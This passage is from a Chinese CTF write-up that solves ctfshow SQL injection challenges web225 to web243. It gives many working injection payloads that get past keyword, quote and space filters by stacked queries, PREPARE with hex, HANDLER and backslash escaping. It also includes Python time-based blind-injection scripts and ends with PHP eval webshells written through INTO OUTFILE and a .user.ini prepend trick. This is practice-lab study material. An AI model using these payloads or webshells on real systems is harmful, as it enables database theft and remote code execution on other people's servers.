id="web225"><a class="markdownIt-Anchor" href="#web225"></a> web225</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="hljs-variable">$username</span>))&#123;<br>   <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br> &#125;<br></code></pre></td></tr></table></figure><p>先show看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;show tables;%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;show columns from ctfshow_flagasa;%23</span><br></code></pre></td></tr></table></figure><h3 id="0x01-15"><a class="markdownIt-Anchor" href="#0x01-15"></a> 0x01</h3><p>可以使用handler进行打开读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=0<span class="hljs-string">&#x27;;handler ctfshow_flagasa open;handler ctfshow_flagasa read next;#</span><br></code></pre></td></tr></table></figure><h3 id="0x02-15"><a class="markdownIt-Anchor" href="#0x02-15"></a> 0x02</h3><p>用预处理的方法解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=0<span class="hljs-string">&#x27;; PREPARE 0raN9e FROM concat(&#x27;</span>selec<span class="hljs-string">&#x27;,&quot;t group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_flagasa<span class="hljs-string">&#x27;&quot;); EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=0<span class="hljs-string">&#x27;; PREPARE 0raN9e FROM concat(&#x27;</span>selec<span class="hljs-string">&#x27;,&#x27;</span>t flagas from ctfshow_flagasa<span class="hljs-string">&#x27;); EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><h2 id="web226"><a class="markdownIt-Anchor" href="#web226"></a> web226</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//师傅说过滤的越多越好</span><br> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="hljs-variable">$username</span>))&#123;<br>   <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br> &#125;<br></code></pre></td></tr></table></figure><p>也是预处理，但是左括号被过滤了，可以hex编码转化，简单的操作一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656c65637420646174616261736528293b;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D2763746673685F6F775F666C6167617327;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C65637420666C61676173622066726F6D2063746673685F6F775F666C61676173;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><h2 id="web227"><a class="markdownIt-Anchor" href="#web227"></a> web227</h2><p>尝试用了上题的预处理翻遍没找到，看看wp吧</p><h3 id="0x01-16"><a class="markdownIt-Anchor" href="#0x01-16"></a> 0x01</h3><p>没什么意义主要看0x02</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?username=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;call getFlag();</span><br></code></pre></td></tr></table></figure><h3 id="0x02-16"><a class="markdownIt-Anchor" href="#0x02-16"></a> 0x02</h3><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">文章</a>，可以查看存储过程和函数的信息，SELECT  *  FROM  information_schema.Routines</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x53454C45435420202A202046524F4D2020696E666F726D6174696F6E5F736368656D612E526F7574696E6573;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><h2 id="web228"><a class="markdownIt-Anchor" href="#web228"></a> web228</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D2763746673685F6F775F666C61676173616127;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C65637420666C6167617362612066726F6D2063746673685F6F775F666C616761736161;EXECUTE 0raN9e;ctfsh_ow_flagasaa</span><br></code></pre></td></tr></table></figure><p>预处理转hex就行，基本同226</p><h2 id="web229"><a class="markdownIt-Anchor" href="#web229"></a> web229</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D27666C616727;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C65637420666C6167617362612066726F6D20666C6167;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><h2 id="web230"><a class="markdownIt-Anchor" href="#web230"></a> web230</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D27666C6167616162627827;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?username=-1<span class="hljs-string">&#x27;;PREPARE 0raN9e from 0x73656C65637420666C616761736261732066726F6D20666C61676161626278;EXECUTE 0raN9e;</span><br></code></pre></td></tr></table></figure><p>这些题都可以是这一个做法，就不多讲了</p><h2 id="web231"><a class="markdownIt-Anchor" href="#web231"></a> web231</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update ctfshow_user set pass = &#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>从这里开始是update注入，网络看一下api默认是<code>?page=1&amp;limit=10</code></p><p>可以进行post传参逐步得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;,username=database()#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;)#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flaga<span class="hljs-string">&#x27;)#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;,username=(select flagas from flaga)#&amp;username=1</span><br></code></pre></td></tr></table></figure><h2 id="web232"><a class="markdownIt-Anchor" href="#web232"></a> web232</h2><p>有了MD5加密，用括号提前闭就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;),username=database()#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;)#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flagaa<span class="hljs-string">&#x27;)#&amp;username=1</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=1<span class="hljs-string">&#x27;),username=(select flagass from flagaa)#&amp;username=1</span><br></code></pre></td></tr></table></figure><p>和上题基本一致</p><h2 id="web233"><a class="markdownIt-Anchor" href="#web233"></a> web233</h2><p>看着和231一样，但是用上面的payload并不能成功，测试一下username这里有注入点，用时间盲注尝试看看是可以成功的，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://7426a816-01f5-4197-8302-1988fa9834c0.challenge.ctf.show/api/?page=1&amp;limit=10&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 查数据库</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        <span class="hljs-comment"># 查表名</span><br>        <span class="hljs-comment">#payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span><br>        <span class="hljs-comment"># 查数据</span><br>        payload = <span class="hljs-string">&quot;select flagass233 from flag233333&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">f&quot;1&#x27; or if(ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,sleep(0.05),1)#&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            r = requests.post(url, data=data, timeout=<span class="hljs-number">0.9</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            head = mid + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="web234"><a class="markdownIt-Anchor" href="#web234"></a> web234</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update ctfshow_user set pass = &#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>过滤了单引号，但是可以进行转义，先上一个payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema=database())%23<br></code></pre></td></tr></table></figure><p>因为\使原来的pass为<code>where username=</code>之后username就可以正常传值注入了</p><p>因为不能出现单引号，可以进行十六进制转化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=0x666c6167323361)%23<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> flagass23s3 from flag23a)%23<br></code></pre></td></tr></table></figure><h2 id="web235"><a class="markdownIt-Anchor" href="#web235"></a> web235</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">//过滤 or &#x27; <br></code></pre></td></tr></table></figure><p>可以进行简单的查库名，但是之后的注入尝试一下就不能成功了，information表也不能用，<a href="https://zhuanlan.zhihu.com/p/98206699">参考文章</a>，可以使用mysql里的内部系统表，innodb_table_stats和mysql.innodb_index_stats</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(table_name) from mysql.innodb_table_stats <span class="hljs-built_in">where</span> database_name=database())%23<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">password</span>=\&amp;username=,username=(<span class="hljs-keyword">select</span> b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag23a1 <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)a)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h2 id="web236"><a class="markdownIt-Anchor" href="#web236"></a> web236</h2><p>多加了flag的过滤实际测试发现并没影响</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(table_name) from mysql.innodb_table_stats <span class="hljs-built_in">where</span> database_name=database())%23<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(o) from (<span class="hljs-keyword">select</span> 1,2 as o,3 union <span class="hljs-keyword">select</span> * from flaga)a)#<br></code></pre></td></tr></table></figure><h2 id="web237"><a class="markdownIt-Anchor" href="#web237"></a> web237</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;<br></code></pre></td></tr></table></figure><p>直接前端的页面插入就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#</span><br></code></pre></td></tr></table></figure><p>查询语句需要整体加括号，然后刷新看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;))#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select flagass23s3 from flag))#</span><br></code></pre></td></tr></table></figure><h2 id="web238"><a class="markdownIt-Anchor" href="#web238"></a> web238</h2><p>//过滤空格</p><p>尝试<code>/**/</code>失败，<code>%09</code>失败，尝试用括号进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;</span>flagb<span class="hljs-string">&#x27;)))#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(flag)from(flagb)))#</span><br></code></pre></td></tr></table></figure><h2 id="web239"><a class="markdownIt-Anchor" href="#web239"></a> web239</h2><p>过滤空格 or ,同web235的内容，前端正常修改就行,测试了一下也是过滤空格的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#</span><br></code></pre></td></tr></table></figure><p>网上搜了一会字母查列，没有查询到，都是猜测的语句，可能是因为括号太多导致不符合sql语句的查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(flag)from(flagbb)))#</span><br></code></pre></td></tr></table></figure><h2 id="web240"><a class="markdownIt-Anchor" href="#web240"></a> web240</h2><p>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">//过滤空格 or sys mysql<br></code></pre></td></tr></table></figure><p>压力🐎，都过滤了，跟着y4师傅的脚本敲了一遍，没回显但是可以去网站上看一下，会发现已经出flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><br>url = <span class="hljs-string">&#x27;http://f7b11a05-b447-4bfd-9850-395e7f32e9ef.challenge.ctf.show/&#x27;</span><br>url_insert = url + <span class="hljs-string">&quot;api/insert.php&quot;</span><br>url_flag = url + <span class="hljs-string">&quot;api/?page=1&amp;limit=1000&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_str_random</span>():<br>    sttr = <span class="hljs-string">&quot;ab&quot;</span><br>    str_list = [random.choice(sttr) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br>    random_str = <span class="hljs-string">&#x27;&#x27;</span>.join(str_list)<br>    <span class="hljs-keyword">return</span> random_str<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data = &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">f&quot;1&#x27;,(select(flag)from(flag<span class="hljs-subst">&#123;generate_str_random()&#125;</span>)))#&quot;</span>,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&quot;aaa&quot;</span><br>    &#125;<br>    r = requests.post(url_insert, data=data)<br>    r2 = requests.get(url_flag)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> r2.text:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r2.json()[<span class="hljs-string">&#x27;data&#x27;</span>]:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> i[<span class="hljs-string">&#x27;pass&#x27;</span>]:<br>                <span class="hljs-built_in">print</span>(i[<span class="hljs-string">&#x27;pass&#x27;</span>])<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web241"><a class="markdownIt-Anchor" href="#web241"></a> web241</h2><p>正常输入语句不会有回显会直接删除，采用盲注</p><p>可以回溯到web175对脚本修改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://5495de70-dd5c-41c5-bcab-d784b3e7f768.challenge.ctf.show/api/delete.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        <span class="hljs-comment">#payload = &#123;&quot;id&quot;: f&quot;0 or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.2),0)&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&quot;id&quot;: f&quot;0 or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.2),0)&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;0 or if(substr((select flag from flag),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.2),0)&quot;</span>&#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>等的时间可能稍微长一点，跑出来是没什么问题的</p><h2 id="web242"><a class="markdownIt-Anchor" href="#web242"></a> web242</h2><p>file注入，找不到注入点，看看wp，参考是在dump.php下，测试一下是成功的</p><p>这里可以通过into outfile来写入webshell,采用字段分割来写入,在/api/dump.php里面写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">filename=1.php<span class="hljs-string">&#x27;lines terminated by &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;#</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-27002812.png" alt="2024-09-20114308"></p><h2 id="web243"><a class="markdownIt-Anchor" href="#web243"></a> web243</h2><p>在上题的基础上过滤了php</p><p>尝试了大小写绕过没有成功，需要用到文件上传的知识，考虑使用<code>.user.ini</code>来进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">filename=.user.ini<span class="hljs-string">&#x27; lines starting by &#x27;</span>auto_prepend_file=orange.txt\n<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">filename=orange.txt<span class="hljs-string">&#x27; lines starting by &quot;&lt;?=eval($_POST[cmd]);?&gt;&quot;#</span><br></code></pre></td></tr></table></figure><p>这里注意由于过滤了php所以🐎里面也不能使用php，简单的绕过一下就可以了</p><p><img 